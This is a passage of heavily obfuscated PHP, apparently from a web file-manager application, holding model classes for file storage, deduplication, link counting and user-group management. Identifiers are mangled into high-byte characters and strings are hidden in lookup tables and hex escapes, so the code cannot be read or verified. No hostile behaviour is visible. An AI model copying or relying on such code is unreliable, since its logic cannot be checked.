Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$¡Şûú’) { return $âıÇï” ? null : array(); } if (!$âıÇï”) { $¡Şûú’ = array_filter(array_values($¡Şûú’)); return array_sort_by($¡Şûú’, $£ô‡äÇË, $ôª»±«ü); } return $¡Şûú’[$_SERVER[•Ùç É][442] . $âıÇï”]; } public function insert($æ»ÎªÛ) { $óäˆÁÜ¼ =& $_SERVER[•Ùç É]; $æ»ÎªÛ = array_field_key($æ»ÎªÛ, $this->field); $‘¸†ñ‘“ = Model($this->modelType)->get($óäˆÁÜ¼[443], $this->optionType . $óäˆÁÜ¼[444]); $‘¸†ñ‘“ = $‘¸†ñ‘“ ? $‘¸†ñ‘“ : 0; $æ»ÎªÛ[$óäˆÁÜ¼[445]] = ++$‘¸†ñ‘“; $æ»ÎªÛ[$óäˆÁÜ¼[217]] = time(); $æ»ÎªÛ[$óäˆÁÜ¼[87]] = time(); Model($this->modelType)->set($óäˆÁÜ¼[443], $‘¸†ñ‘“, $this->optionType . $óäˆÁÜ¼[444]); Model($this->modelType)->set($óäˆÁÜ¼[442] . $‘¸†ñ‘“, $æ»ÎªÛ, $this->optionType); return $‘¸†ñ‘“; } public function update($¿˜¡°§, $áèİ¥ºÜ) { $ç­‘ØÁ» =& $_SERVER[•Ùç É]; $áèİ¥ºÜ = array_field_key($áèİ¥ºÜ, $this->field); $”§ÚÚ¦ = $this->listData($¿˜¡°§); if (!$”§ÚÚ¦ || !$¿˜¡°§) { return !1; } $áèİ¥ºÜ = array_merge($”§ÚÚ¦, $áèİ¥ºÜ); $áèİ¥ºÜ[$ç­‘ØÁ»[87]] = time(); return Model($this->modelType)->set($ç­‘ØÁ»[442] . $¿˜¡°§, $áèİ¥ºÜ, $this->optionType); } public function remove($ê×Ş²á«) { if (!$ê×Ş²á«) { return !1; } return Model($this->modelType)->remove($_SERVER[•Ùç É][442] . $ê×Ş²á«, $this->optionType); } public function clear() { $¢¢”Íó¾ =& $_SERVER[•Ùç É]; Model($this->modelType)->remove($¢¢”Íó¾[443], $this->optionType . $¢¢”Íó¾[444]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($„³Ë…Õ¹, $„¾»ªö) { if (!$„¾»ªö) { return !1; } $¢“Ãä« = $this->listData(); $¢“Ãä« = array_to_keyvalue($¢“Ãä«, $„³Ë…Õ¹); return isset($¢“Ãä«[$„¾»ªö]) ? $¢“Ãä«[$„¾»ªö] : !1; } public function findByName($Óù¥±ã) { return $this->findByKey($_SERVER[•Ùç É][32], $Óù¥±ã); } protected function resetData($‰§íœè‹) { $Á³íë˜İ =& $_SERVER[•Ùç É]; $‰§íœè‹ = is_array($‰§íœè‹) ? $‰§íœè‹ : array(); $é£ÅÊá¡ = array(); for ($ÈúâîÈº = 0; $ÈúâîÈº < count($‰§íœè‹); $ÈúâîÈº++) { $é£ÅÊá¡[$Á³íë˜İ[442] . $‰§íœè‹[$ÈúâîÈº][$Á³íë˜İ[445]]] = $‰§íœè‹[$ÈúâîÈº]; } return Model($this->modelType)->set($é£ÅÊá¡, !1, $this->optionType); } private function getAutoName($¢¬‹î®) { $Ó Ïî¹ = array_to_keyvalue($this->listData(), $_SERVER[•Ùç É][32]); if (!$Ó Ïî¹ || !isset($Ó Ïî¹[$¢¬‹î®])) { return $¢¬‹î®; } for ($ğâîÍï¥ = 1; $ğâîÍï¥ < count($Ó Ïî¹); $ğâîÍï¥++) { $†‘ÏŒîÍ = $¢¬‹î® . "\x28{$ğâîÍï¥}\51"; if (!isset($Ó Ïî¹[$†‘ÏŒîÍ])) { return $†‘ÏŒîÍ; } } return $†‘ÏŒîÍ; } } goto F•‘‡†èô; DŞÆ”Ñ¬³: class FileModel extends ModelBase { protected $tableName = "\151\157\x5f\146\x69\154\x65"; protected $tableMeta = array("\x74\141\x62\154\x65\116\141\155\x65" => "\151\x6f\x5f\146\x69\x6c\x65\x5f\155\x65\x74\x61", "\155\145\x74\x61\106\151\145\x6c\x64" => "\146\151\x6c\x65\x49\x44"); public function fileInfo($–Ï®ùğÁ) { $Ò®öÍú‰ =& $_SERVER[•Ùç É]; static $œÃòÜ‘ = array(); if (!isset($œÃòÜ‘[$–Ï®ùğÁ])) { $šËÍéÌ = $Ò®öÍú‰[1953]; $Í¿°³Ø© = Model($Ò®öÍú‰[514])->field($šËÍéÌ)->where(array($Ò®öÍú‰[512] => $–Ï®ùğÁ))->find(); $œÃòÜ‘[$–Ï®ùğÁ] = $Í¿°³Ø©; } return $œÃòÜ‘[$–Ï®ùğÁ]; } public function addFileByContent($•Ä‰İ· = '', $Æ°‹Ñ–® = '') { $Ûª¯èŒŸ =& $_SERVER[•Ùç É]; $İãè¨âñ = TEMP_PATH . $Ûª¯èŒŸ[1954]; if (!is_dir($İãè¨âñ)) { mk_dir($İãè¨âñ); } $¸Â²åÖÁ = $İãè¨âñ . $Ûª¯èŒŸ[1955] . rand_string(16); file_put_contents($¸Â²åÖÁ, $•Ä‰İ·); $ß£Şäó = $this->addFile($¸Â²åÖÁ, $Æ°‹Ñ–®, !0); if (file_exists($¸Â²åÖÁ)) { @unlink($¸Â²åÖÁ); } return $ß£Şäó; } public function createFileName($ëÆÏİ¯€, $Ù×÷í’ = false, $Òõìà¼• = false) { $¶”·§Úª =& $_SERVER[•Ùç É]; $¿ØºüÉÕ = IO::init($¶”·§Úª[8]); $óşÃƒıÒ = $this->makeFilePath($ëÆÏİ¯€, $¿ØºüÉÕ, $Ù×÷í’, $Òõìà¼•); $âºÎ†ó˜ = $¿ØºüÉÕ->pathFather($óşÃƒıÒ); static $îı°Š = false; $šé¤æáª = $¶”·§Úª[1956] . md5($âºÎ†ó˜); if (!$îı°Š && !Cache::get($šé¤æáª)) { $îı°Š = !0; $ëöÓ®–Ş = IO::mkdir($âºÎ†ó˜); if (!IO::exist($ëöÓ®–Ş . $¶”·§Úª[842])) { IO::mkfile($ëöÓ®–Ş . $¶”·§Úª[842]); } Cache::set($šé¤æáª, 1, 3600 * 2); } return $óşÃƒıÒ; } public function makeFilePath($ÈË˜–Ä¶, $‘ËÄ¬ÏÜ, $½öşŞ–£ = false, $šğ—ˆâƒ = false) { $ÑºáÔôÚ =& $_SERVER[•Ùç É]; $ËÔ¶ÙßÖ = Model($ÑºáÔôÚ[815])->get($ÑºáÔôÚ[1957]); $Ô›Âñ­õ = KodIO::defaultIO() . date($ÑºáÔôÚ[1958]); $‘„½ĞÔ„ = $Ô›Âñ­õ . rand_string(5) . short_id(100); $ÈË˜–Ä¶ = str_replace($ÑºáÔôÚ[8], $ÑºáÔôÚ[11], KodIO::clear($ÈË˜–Ä¶)); $»üŞèãÈ = $‘ËÄ¬ÏÜ->ext($ÈË˜–Ä¶); if (!$ÈË˜–Ä¶) { $ËÔ¶ÙßÖ = $ÑºáÔôÚ[1959]; } switch ($ËÔ¶ÙßÖ) { case $ÑºáÔôÚ[1960]: $‘„½ĞÔ„ = $‘„½ĞÔ„ . $ÑºáÔôÚ[10] . $‘ËÄ¬ÏÜ->ext($ÈË˜–Ä¶); if ($»üŞèãÈ == $ÑºáÔôÚ[1897]) { $‘„½ĞÔ„ .= $ÑºáÔôÚ[1257]; } break; case $ÑºáÔôÚ[1961]: $×„Ê¢»… = Model($ÑºáÔôÚ[815])->get($ÑºáÔôÚ[816]); $üÜÇ·Õ = substr(md5($ÑºáÔôÚ[817] . $×„Ê¢»… . date($ÑºáÔôÚ[793])), 0, 8); $ó£¶¥í† = KodIO::defaultDriver(); $Ô›Âñ­õ = $ÑºáÔôÚ[1288] . $ó£¶¥í†[$ÑºáÔôÚ[445]] . $ÑºáÔôÚ[454] . date($ÑºáÔôÚ[1962]) . $üÜÇ·Õ . $ÑºáÔôÚ[8]; if ($»üŞèãÈ == $ÑºáÔôÚ[1897]) { $ÈË˜–Ä¶ .= $ÑºáÔôÚ[1257]; } $Ò¥ªßİÕ = $ÑºáÔôÚ[1963] . $Ô›Âñ­õ . $ÈË˜–Ä¶; CacheLock::lock($Ò¥ªßİÕ); $‘„½ĞÔ„ = $Ô›Âñ­õ . $ÈË˜–Ä¶; if (IO::exist($Ô›Âñ­õ . $ÈË˜–Ä¶)) { $İø”—Õ = substr($ÈË˜–Ä¶, 0, strlen($ÈË˜–Ä¶) - strlen($»üŞèãÈ)); $ÚøÛïÉì = $šğ—ˆâƒ ? substr($šğ—ˆâƒ, 0, 5) : ($½öşŞ–£ ? substr($½öşŞ–£, 0, 5) : rand_string(5)); $‘„½ĞÔ„ = $Ô›Âñ­õ . $İø”—Õ . $ÚøÛïÉì . $ÑºáÔôÚ[10] . $»üŞèãÈ; } if (IO::isTypeObject($‘„½ĞÔ„) && !IO::isUploadServer($‘„½ĞÔ„)) { if (IO::exist($‘„½ĞÔ„)) { return $‘„½ĞÔ„; } $­ñ¾×ô = IO::setContent($‘„½ĞÔ„, $ÑºáÔôÚ[12]); if (!$­ñ¾×ô) { show_json($ÑºáÔôÚ[1964], !1); } } CacheLock::unlock($Ò¥ªßİÕ); break; case $ÑºáÔôÚ[1959]: break; default: break; } return $‘„½ĞÔ„; } public function addFileByRemote($şäÒŒŞ³, $Ëâ¬Ô¡³, $¨«îõµŸ = array()) { $â›ŒíÖ =& $_SERVER[•Ùç É]; if (!IO::exist($şäÒŒŞ³)) { return !1; } $“¦º•·Ô = $¨«îõµŸ[$â›ŒíÖ[517]] ? $¨«îõµŸ[$â›ŒíÖ[517]] : $â›ŒíÖ[12]; $šÏà»à­ = IO::hashMd5($şäÒŒŞ³, $“¦º•·Ô); $Óµ£şÏÅ = KodIO::defaultDriver(); $Ã¸ˆıœ  = array($â›ŒíÖ[587] => IO::size($şäÒŒŞ³), $â›ŒíÖ[1965] => 1, $â›ŒíÖ[464] => $Ëâ¬Ô¡³, $â›ŒíÖ[853] => $Óµ£şÏÅ[$â›ŒíÖ[445]], $â›ŒíÖ[465] => $şäÒŒŞ³, $â›ŒíÖ[1966] => $¨«îõµŸ[$â›ŒíÖ[642]] ? $¨«îõµŸ[$â›ŒíÖ[642]] : IO::hashSimple($şäÒŒŞ³), $â›ŒíÖ[1967] => $šÏà»à­ ? $šÏà»à­ : $“¦º•·Ô); if ($º…Ñ››» = $this->addFileCheckExist($Ã¸ˆıœ [$â›ŒíÖ[642]], $Ã¸ˆıœ [$â›ŒíÖ[517]], $Ã¸ˆıœ [$â›ŒíÖ[78]])) { return $º…Ñ››»; } return $this->addFileData($Ã¸ˆıœ ); } private function addFileData($ƒ»›¢Â) { $´ì¡±öÊ =& $_SERVER[•Ùç É]; if (!$ƒ»›¢Â) { return !1; } $ƒ»›¢Â[$´ì¡±öÊ[78]] = intval($ƒ»›¢Â[$´ì¡±öÊ[78]]); if (!$ƒ»›¢Â[$´ì¡±öÊ[78]] && strlen($ƒ»›¢Â[$´ì¡±öÊ[642]]) > 32) { $ƒ»›¢Â[$´ì¡±öÊ[78]] = intval(substr($ƒ»›¢Â[$´ì¡±öÊ[642]], 32)); } $Ùêâ„¸„ = $this->add($ƒ»›¢Â); return $this->find($Ùêâ„¸„); } public function addFile($á’ÏÜøş, $¬¦Àº®, $¨¦Ì²‘ = false) { $ê¤Ï°Şô =& $_SERVER[•Ùç É]; $÷ÈÍ™šì = IO::hashSimple($á’ÏÜøş); $œîğŞãÆ = IO::size($á’ÏÜøş); $ï¾ª®ˆÊ = $œîğŞãÆ <= 1024 * 1024 * 10 ? IO::hashMd5($á’ÏÜøş) : $ê¤Ï°Şô[12]; $Ìª‚‚ßå = $ê¤Ï°Şô[1968] . $÷ÈÍ™šì; CacheLock::lock($Ìª‚‚ßå); if ($ï¾ª®ˆÊ && $÷ÈÍ™šì) { $âšÙàé§ = $this->addFileCheckExist($÷ÈÍ™šì, $ï¾ª®ˆÊ, $œîğŞãÆ); if ($âšÙàé§) { CacheLock::unlock($Ìª‚‚ßå); return $âšÙàé§; } } $‡üæöô = $this->addFileMake($á’ÏÜøş, $œîğŞãÆ, $÷ÈÍ™šì, $ï¾ª®ˆÊ, $¬¦Àº®, $¨¦Ì²‘); $şë÷êÔÙ = $this->addFileData($‡üæöô); CacheLock::unlock($Ìª‚‚ßå); if (!$ï¾ª®ˆÊ && $şë÷êÔÙ) { $this->fileMd5Check($şë÷êÔÙ); } return $şë÷êÔÙ; } public function fileMd5Check($Ò¿“½Œ) { $Ó·Ñšˆæ =& $_SERVER[•Ùç É]; $÷ŞÛÜ¶ = array($Ò¿“½Œ[$Ó·Ñšˆæ[511]], $Ò¿“½Œ[$Ó·Ñšˆæ[86]]); $Æ¾ˆ²¹ü = $Ó·Ñšˆæ[1969] . $Ò¿“½Œ[$Ó·Ñšˆæ[86]]; $ˆ›Ç„É¥ = $Ó·Ñšˆæ[1970] . $Ò¿“½Œ[$Ó·Ñšˆæ[511]]; TaskQueue::add($Ó·Ñšˆæ[1971], $÷ŞÛÜ¶, $Æ¾ˆ²¹ü, $ˆ›Ç„É¥); } public function fileMd5Set($€î™ñè, $ÓîŞ¸¤ì) { $˜à…†éØ =& $_SERVER[•Ùç É]; $ù²Êß™’ = $this->find($€î™ñè); if (!$ù²Êß™’ || $ù²Êß™’[$˜à…†éØ[517]]) { return; } $İÅ¸ŸÕ“ = IO::hashMd5($ÓîŞ¸¤ì); if (!$İÅ¸ŸÕ“) { return $˜à…†éØ[12]; } $this->where(array($˜à…†éØ[511] => $€î™ñè))->save(array($˜à…†éØ[517] => $İÅ¸ŸÕ“)); } public function addFileMake($¥çÒ‘°, $˜¬¡³Ï, $òğÚ¢Ù», $ÒÇ÷¢İô, $š›¤£Ì, $—£Õö¦Ù) { $í¬Ô–¶Ÿ =& $_SERVER[•Ùç É]; $ä–€À€½ = $this->createFileName($š›¤£Ì, $òğÚ¢Ù», $ÒÇ÷¢İô); $ı±Í˜â = get_path_father($ä–€À€½); $ğ¯ËÚ‚‘ = get_path_this($ä–€À€½); if ($—£Õö¦Ù) { $†êÛ™È« = IO::move($¥çÒ‘°, $ı±Í˜â, !1, $ğ¯ËÚ‚‘); } else { $†êÛ™È« = IO::copy($¥çÒ‘°, $ı±Í˜â, !1, $ğ¯ËÚ‚‘); } if (!$†êÛ™È«) { return !1; } $™Ø§ñÌ = KodIO::defaultDriver(); $ıÚ±¬üÊ = array($í¬Ô–¶Ÿ[587] => $˜¬¡³Ï, $í¬Ô–¶Ÿ[1965] => 1, $í¬Ô–¶Ÿ[464] => $š›¤£Ì, $í¬Ô–¶Ÿ[853] => $™Ø§ñÌ[$í¬Ô–¶Ÿ[445]], $í¬Ô–¶Ÿ[465] => $ä–€À€½, $í¬Ô–¶Ÿ[1966] => $òğÚ¢Ù», $í¬Ô–¶Ÿ[1967] => $ÒÇ÷¢İô); return $ıÚ±¬üÊ; } public function addFileCheckExist($ó³¾¥, $³Ùöë, $š­öÏãñ) { $ĞÜğ ä =& $_SERVER[•Ùç É]; $ÇŞœ‰®Í = $this->findByHash($ó³¾¥, $³Ùöë); if (!$ÇŞœ‰®Í) { return !1; } $ç…Ä® = array($ĞÜğ ä[1965] => intval($ÇŞœ‰®Í[$ĞÜğ ä[1972]]) + 1, $ĞÜğ ä[587] => $š­öÏãñ); $this->where(array($ĞÜğ ä[512] => $ÇŞœ‰®Í[$ĞÜğ ä[511]]))->save($ç…Ä®); return $ÇŞœ‰®Í; } public function remove($æ°«ıÉ) { $this->linkCountChange($æ°«ıÉ, !1); $this->clearEmpty(); return !0; } public function linkAdd($¯üƒˆğ) { $this->linkCountChange($¯üƒˆğ, !0); } public function linkCountChange($½ÌÏï¾í, $™ïÃª’Ç) { $Ü…ƒÙâ¡ =& $_SERVER[•Ùç É]; if (!$½ÌÏï¾í) { return; } if (!is_array($½ÌÏï¾í)) { $½ÌÏï¾í = array($½ÌÏï¾í); } $äõë› = array(); foreach ($½ÌÏï¾í as $ê—óåî­) { $£¾¬îÓä = $ê—óåî­ . $Ü…ƒÙâ¡[12]; if (!$äõë›[$£¾¬îÓä]) { $äõë›[$£¾¬îÓä] = 0; } $äõë›[$£¾¬îÓä]++; } $ªßå“Ìğ = array(); foreach ($äõë› as $ê—óåî­ => $ƒÌ¯±ö‚) { $£¾¬îÓä = $ƒÌ¯±ö‚ . $Ü…ƒÙâ¡[12]; if (!$ªßå“Ìğ[$£¾¬îÓä]) { $ªßå“Ìğ[$£¾¬îÓä] = array(); } $ªßå“Ìğ[$£¾¬îÓä][] = $ê—óåî­; } foreach ($ªßå“Ìğ as $ƒÌ¯±ö‚ => $º¡‡¹Ó) { if (!$º¡‡¹Ó) { continue; } $ƒÌ¯±ö‚ = $™ïÃª’Ç ? $ƒÌ¯±ö‚ : -intval($ƒÌ¯±ö‚); $µôìÌÛÕ = array($Ü…ƒÙâ¡[511] => array($Ü…ƒÙâ¡[7], $º¡‡¹Ó)); if ($ƒÌ¯±ö‚ < 0) { $µôìÌÛÕ[$Ü…ƒÙâ¡[1972]] = array($Ü…ƒÙâ¡[1066], abs($ƒÌ¯±ö‚)); } $this->where($µôìÌÛÕ)->setAdd($Ü…ƒÙâ¡[1972], $ƒÌ¯±ö‚); } } public function findByHash($—É…ìÅœ, $À‰åÒœö = false) { $Ê·¼ˆø =& $_SERVER[•Ùç É]; if (!$—É…ìÅœ && !$À‰åÒœö) { return !1; } $èâÔ‰Ôã = array($Ê·¼ˆø[1966] => $—É…ìÅœ); if ($À‰åÒœö) { $èâÔ‰Ôã = array($Ê·¼ˆø[1967] => $À‰åÒœö); } return $this->order($Ê·¼ˆø[1973])->where($èâÔ‰Ôã)->find(); } public function clearEmpty($òùÊËó• = 0) { $çÜ’‹¼› =& $_SERVER[•Ùç É]; $€İİ¦ = time() - 3600 * 24 * $òùÊËó•; $îô¼´°Â = $çÜ’‹¼›[1974] . $€İİ¦; $èíè¦¡ = $this->where($îô¼´°Â)->select(); if (!$èíè¦¡) { return; } $Œ°òšÁ = new Task($çÜ’‹¼›[1975], $çÜ’‹¼›[12], count($èíè¦¡)); foreach ($èíè¦¡ as $¿Ÿ÷Ùİ) { $Œ°òšÁ->update(1); $this->resetFile($¿Ÿ÷Ùİ); } $Œ°òšÁ->end(); } public function resetFile($¯˜‚ƒ°) { $ë˜“Œ£á =& $_SERVER[•Ùç É]; $ÄßşşÜ = array($ë˜“Œ£á[512] => $¯˜‚ƒ°[$ë˜“Œ£á[511]]); $´úÓîÅÖ = Model($ë˜“Œ£á[1384])->where($ÄßşşÜ)->count(); $’Åäèš = Model($ë˜“Œ£á[1976])->where($ÄßşşÜ)->count(); $¿»ÃŞŒ³ = intval($´úÓîÅÖ) + intval($’Åäèš); if ($¿»ÃŞŒ³ == 0) { IO::remove($¯˜‚ƒ°[$ë˜“Œ£á[86]]); Model($ë˜“Œ£á[1977])->delete($¯˜‚ƒ°[$ë˜“Œ£á[511]]); $this->where($ÄßşşÜ)->delete(); $this->metaSet($¯˜‚ƒ°[$ë˜“Œ£á[511]], null, null); return; } if ($¯˜‚ƒ°[$ë˜“Œ£á[1972]] != $¿»ÃŞŒ³) { $this->where($ÄßşşÜ)->save(array($ë˜“Œ£á[1965] => $¿»ÃŞŒ³)); } } public function storageInfo($Û…¬×ØÄ = false) { $Œ¢Å·ã =& $_SERVER[•Ùç É]; $å§ÀĞ±• = $this->count() + 0.0; $Èß¸¶ö¬ = 0; $”†²Ö±³ = 1; $ŒÁÛİú“ = 0; $ŞÚ‰Ç¯ = 5000; for ($¼È¯Ìë¿ = 0; $¼È¯Ìë¿ < $å§ÀĞ±•; $¼È¯Ìë¿ = $¼È¯Ìë¿ + $ŞÚ‰Ç¯) { $ÄÉ¹€Ë² = $this->limit($¼È¯Ìë¿, $¼È¯Ìë¿ + $ŞÚ‰Ç¯)->select(); foreach ($ÄÉ¹€Ë² as $­ªÇ‚Ä) { $”†²Ö±³ += $­ªÇ‚Ä[$Œ¢Å·ã[78]] * $­ªÇ‚Ä[$Œ¢Å·ã[1972]]; $Èß¸¶ö¬ += $­ªÇ‚Ä[$Œ¢Å·ã[78]] * ($­ªÇ‚Ä[$Œ¢Å·ã[1972]] - 1); $ŒÁÛİú“ += $­ªÇ‚Ä[$Œ¢Å·ã[1972]]; } } $µÄ¦ìü = array($Œ¢Å·ã[1978] => $”†²Ö±³, $Œ¢Å·ã[1979] => $Èß¸¶ö¬, $Œ¢Å·ã[1980] => $Èß¸¶ö¬ / $”†²Ö±³, $Œ¢Å·ã[82] => $å§ÀĞ±•, $Œ¢Å·ã[1981] => $ŒÁÛİú“); return $µÄ¦ìü; } } class GroupModel extends ModelBase { protected $tableName = "\147\x72\x6f\165\x70"; protected $tableMeta = array("\x74\141\142\x6c\x65\116\141\155\145" => "\147\x72\157\165\x70\x5f\155\145\x74\141", "\x6d\x65\x74\x61\106\151\x65\154\x64" => "\147\x72\157\165\x70\x49\104"); protected function cacheFunctionAlias($¼“Çæ©¼) { $¯¨Íîä =& $_SERVER[•Ùç É]; return array($¯¨Íîä[1982] => array($¼“Çæ©¼[0], $¯¨Íîä[1983]), $¯¨Íîä[1984] => array($¼“Çæ©¼[0], $¯¨Íîä[1985])); } protected function getInfo($ûÂ·§ùï, $¡áŸÊôÊ = false) { $¾£ŸÈ¥Ñ = $this->getInfoSimple($ûÂ·§ùï); if (!$¾£ŸÈ¥Ñ) { return !1; } if ($¡áŸÊôÊ) { return $this->_listDataApplyItem($¾£ŸÈ¥Ñ); } return $this->cacheFunctionGet($_SERVER[•Ùç É][1986], $ûÂ·§ùï); } protected function getInfoSimple($ü˜ÔÄ™», $Ì¼´ƒ´ö = false) { $ŞÎÌŸ¥ˆ =& $_SERVER[•Ùç É]; if ($Ì¼´ƒ´ö) { $Ü¶áâ€ = array($ŞÎÌŸ¥ˆ[1904] => intval($ü˜ÔÄ™»)); $åÂšÉú— = $this->where($Ü¶áâ€)->find(); return is_array($åÂšÉú—) ? $åÂšÉú— : array(); } return $this->cacheFunctionGet($ŞÎÌŸ¥ˆ[1987], $ü˜ÔÄ™»); } protected function groupAdd($„ÁÔÕ”¿) { $©İ›€‡Ø =& $_SERVER[•Ùç É]; if (!$„ÁÔÕ”¿[$©İ›€‡Ø[182]] && isset($„ÁÔÕ”¿[$©İ›€‡Ø[1904]]) && $„ÁÔÕ”¿[$©İ›€‡Ø[1904]] == 1) { if ($ó¯şÃ™‘ = $this->getInfoSimple($„ÁÔÕ”¿[$©İ›€‡Ø[1904]], !0)) { return $„ÁÔÕ”¿[$©İ›€‡Ø[1904]]; } } else { $ó¯şÃ™‘ = $this->getInfoSimple($„ÁÔÕ”¿[$©İ›€‡Ø[182]]); if (!$ó¯şÃ™‘) { return !1; } } $÷‚·í¤Ï = $©İ›€‡Ø[565]; if ($ó¯şÃ™‘[$©İ›€‡Ø[555]]) { $÷‚·í¤Ï = $ó¯şÃ™‘[$©İ›€‡Ø[555]] . $ó¯şÃ™‘[$©İ›€‡Ø[1904]] . $©İ›€‡Ø[50]; } $˜÷¬éÌÂ = array($©İ›€‡Ø[464] => $this->groupNameAuto($„ÁÔÕ”¿[$©İ›€‡Ø[182]], $„ÁÔÕ”¿[$©İ›€‡Ø[32]]), $©İ›€‡Ø[447] => $„ÁÔÕ”¿[$©İ›€‡Ø[182]], $©İ›€‡Ø[622] => $÷‚·í¤Ï, $©İ›€‡Ø[1988] => $„ÁÔÕ”¿[$©İ›€‡Ø[1891]], $©İ›€‡Ø[1989] => 0, $©İ›€‡Ø[1908] => 0); if (isset($„ÁÔÕ”¿[$©İ›€‡Ø[1928]])) { $˜÷¬éÌÂ[$©İ›€‡Ø[1928]] = $„ÁÔÕ”¿[$©İ›€‡Ø[1928]]; } else { $™üÆËé = $this->max($©İ›€‡Ø[1928]); if (!$™üÆËé) { $™üÆËé = 0; } $˜÷¬éÌÂ[$©İ›€‡Ø[1928]] = $™üÆËé + 1; } if (!empty($„ÁÔÕ”¿[$©İ›€‡Ø[1904]])) { $˜÷¬éÌÂ[$©İ›€‡Ø[1904]] = $„ÁÔÕ”¿[$©İ›€‡Ø[1904]]; } $…åôØäÛ = $this->add($˜÷¬éÌÂ); $this->setNamePinyin($…åôØäÛ, $˜÷¬éÌÂ[$©İ›€‡Ø[32]]); if (isset($„ÁÔÕ”¿[$©İ›€‡Ø[1990]])) { $this->metaSet($…åôØäÛ, array($©İ›€‡Ø[1990] => $„ÁÔÕ”¿[$©İ›€‡Ø[1990]], $©İ›€‡Ø[1991] => $„ÁÔÕ”¿[$©İ›€‡Ø[1991]])); unset($„ÁÔÕ”¿[$©İ›€‡Ø[1990]]); unset($„ÁÔÕ”¿[$©İ›€‡Ø[1991]]); } Model($©İ›€‡Ø[1384])->groupRootAdd($…åôØäÛ); $this->_clearCache($„ÁÔÕ”¿[$©İ›€‡Ø[182]]); return $…åôØäÛ; } protected function groupEdit($µÙ”’ —, $ô”Â«Æ) { $ï¸ªš =& $_SERVER[•Ùç É]; $ŠÍ§Å©À = $this->getInfoSimple($µÙ”’ —); if (!$ŠÍ§Å©À) { return !1; } if (!empty($ô”Â«Æ[$ï¸ªš[182]])) { $„ó”ùÖŒ = $this->getInfoSimple($ô”Â«Æ[$ï¸ªš[182]]); if (!$„ó”ùÖŒ) { return !1; } if ($ŠÍ§Å©À[$ï¸ªš[1904]] == $„ó”ùÖŒ[$ï¸ªš[1904]]) { return !1; } if ($ô”Â«Æ[$ï¸ªš[182]] != $ŠÍ§Å©À[$ï¸ªš[182]]) { if ($„ó”ùÖŒ[$ï¸ªš[555]] !== $ŠÍ§Å©À[$ï¸ªš[555]] && strpos($„ó”ùÖŒ[$ï¸ªš[555]], $ŠÍ§Å©À[$ï¸ªš[555]] . $ŠÍ§Å©À[$ï¸ªš[1904]] . $ï¸ªš[50]) === 0) { return !1; } $ô”Â«Æ[$ï¸ªš[622]] = $„ó”ùÖŒ[$ï¸ªš[555]] . $ô”Â«Æ[$ï¸ªš[182]] . $ï¸ªš[50]; $this->_changeChildLevel($ŠÍ§Å©À, $„ó”ùÖŒ); $this->_clearCache($„ó”ùÖŒ[$ï¸ªš[1904]]); $this->_clearCache($ŠÍ§Å©À[$ï¸ªš[182]]); } } if (isset($ô”Â«Æ[$ï¸ªš[32]])) { $this->setNamePinyin($µÙ”’ —, $ô”Â«Æ[$ï¸ªš[32]]); } if (isset($ô”Â«Æ[$ï¸ªš[1990]])) { $this->metaSet($µÙ”’ —, array($ï¸ªš[1990] => $ô”Â«Æ[$ï¸ªš[1990]], $ï¸ªš[1991] => $ô”Â«Æ[$ï¸ªš[1991]])); unset($ô”Â«Æ[$ï¸ªš[1990]]); unset($ô”Â«Æ[$ï¸ªš[1991]]); } $this->_clearChildrenCache($ŠÍ§Å©À); return $this->where(array($ï¸ªš[1992] => $µÙ”’ —))->save($ô”Â«Æ); } private function _clearChildrenCache($›—•©²) { $ª¯ğ´¡À =& $_SERVER[•Ùç É]; $ï¯ªºˆ = array($ª¯ğ´¡À[622] => array($ª¯ğ´¡À[582], $›—•©²[$ª¯ğ´¡À[555]] . $›—•©²[$ª¯ğ´¡À[1904]] . $ª¯ğ´¡À[583])); $éó¬ ß = $this->field($ª¯ğ´¡À[1904])->where($ï¯ªºˆ)->select(); foreach ($éó¬ ß as $Á¼îŞş) { $this->_clearCache($Á¼îŞş[$ª¯ğ´¡À[1904]]); } } private function _clearCache($Éîµ—´Ü) { $î±®ê„ =& $_SERVER[•Ùç É]; $this->cacheFunctionClear($î±®ê„[1986], $Éîµ—´Ü); $this->cacheFunctionClear($î±®ê„[1987], $Éîµ—´Ü); } private function _changeChildLevel($å—ÈåşÒ, $‚ãŸë‡, $« ®ÜÔ = false) { $—…ä¨ùµ =& $_SERVER[•Ùç É]; $ËñÊ½¨ê = $å—ÈåşÒ[$—…ä¨ùµ[555]] . $å—ÈåşÒ[$—…ä¨ùµ[1904]] . $—…ä¨ùµ[50]; $ŞßÌƒ¯½ = $‚ãŸë‡[$—…ä¨ùµ[555]] . $‚ãŸë‡[$—…ä¨ùµ[1904]] . $—…ä¨ùµ[50] . $å—ÈåşÒ[$—…ä¨ùµ[1904]] . $—…ä¨ùµ[50]; if ($« ®ÜÔ) { $ŞßÌƒ¯½ = $‚ãŸë‡[$—…ä¨ùµ[555]] . $‚ãŸë‡[$—…ä¨ùµ[1904]] . $—…ä¨ùµ[50]; } $£ó³ÃÕó = array($—…ä¨ùµ[622] => array($—…ä¨ùµ[582], $å—ÈåşÒ[$—…ä¨ùµ[555]] . $å—ÈåşÒ[$—…ä¨ùµ[1904]] . $—…ä¨ùµ[583])); $ŒùŞè› = array($—…ä¨ùµ[622] => array($—…ä¨ùµ[631], "\162\x65\160\154\141\143\x65\x28\160\141\x72\145\x6e\x74\114\x65\x76\x65\x6c\x2c\47{$ËñÊ½¨ê}\x27\54\47{$ŞßÌƒ¯½}\x27\51")); $this->_clearChildrenCache($å—ÈåşÒ); $this->where($£ó³ÃÕó)->data($ŒùŞè›)->save(); } public function setNamePinyin($ììªò·Ù, $Æ®Ğ—Û = false) { $ò§Ğñ =& $_SERVER[•Ùç É]; if (!$Æ®Ğ—Û) { $‹•æß¾á = $this->getInfoSimple($ììªò·Ù); $Æ®Ğ—Û = $‹•æß¾á[$ò§Ğñ[32]]; } if (!Input::check($Æ®Ğ—Û, $ò§Ğñ[625])) { $this->metaSet($ììªò·Ù, $ò§Ğñ[508], null); $this->metaSet($ììªò·Ù, $ò§Ğñ[507], null); return; } $ø¤¤Ì« = array($ò§Ğñ[508] => str_replace($ò§Ğñ[53], $ò§Ğñ[12], Pinyin::get($Æ®Ğ—Û)), $ò§Ğñ[507] => Pinyin::get($Æ®Ğ—Û, $ò§Ğñ[626])); $this->metaSet($ììªò·Ù, $ø¤¤Ì«); } protected function groupStatus($ü·åúÑ, $°×¡»ì») { $è¸Û¬Š› =& 